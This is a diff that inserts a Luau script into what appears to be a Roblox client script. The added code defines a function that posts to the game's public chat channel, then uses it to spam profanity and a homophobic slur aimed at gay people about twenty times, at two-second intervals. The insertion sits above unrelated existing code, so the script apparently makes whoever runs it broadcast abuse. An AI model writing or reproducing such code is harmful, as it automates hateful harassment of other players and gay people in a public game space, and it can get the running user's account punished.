@@ -1,3 +1,70 @@
+local TextChatService = game:GetService("TextChatService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local isLegacyChat = TextChatService.ChatVersion == Enum.ChatVersion.LegacyChatService
+
+local function SendMessage(message)
+    message = tostring(message)
+
+    if not isLegacyChat then
+        local generalChannel = TextChatService:FindFirstChild("TextChannels") and TextChatService.TextChannels:FindFirstChild("RBXGeneral")
+        if generalChannel then
+            generalChannel:SendAsync(message)
+        else
+            warn("RBXGeneral channel not found.")
+        end
+    else
+        local sayMessage = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
+        if sayMessage then
+            sayMessage:FindFirstChild("SayMessageRequest"):FireServer(message, "All")
+        else
+            warn("SayMessageRequest not found.")
+        end
+    end
+end
+
+SendMessage("Fuck you!")
+wait(2)
+SendMessage("Fuck you!")
+wait(2)
+SendMessage("bitch")
+wait(2)
+SendMessage("Fuck you Gays")
+wait(2)
+SendMessage("Fuck you Gays")
+wait(2)
+SendMessage("Fuck you Gays")
+wait(2)
+SendMessage("Fuck you Gays")
+wait(2)
+SendMessage("Fuck you Gays")
+wait(2)
+SendMessage("Fuck you Gays")
+wait(2)
+SendMessage("Fuck you Gays")
+wait(2)
+SendMessage("Fuck you Gays")
+wait(2)
+SendMessage("Fuck you Gays")
+wait(2)
+SendMessage("Fuck you Gays")
+wait(2)
+SendMessage("Fuck you Gays")
+wait(2)
+SendMessage("Fuck you Gays")
+wait(2)
+SendMessage("Fuck you Gays")
+wait(2)
+SendMessage("Fuck you Gays")
+wait(2)
+SendMessage("Fuck you Gays")
+wait(2)
+SendMessage("Fuck you Gays")
+wait(2)
+SendMessage("Fuck you Gays")
+wait(2)
+SendMessage("Fuck you Gays")
+
 local Player = game.Players.LocalPlayer
 local PlayerGui = Player.PlayerGui
 
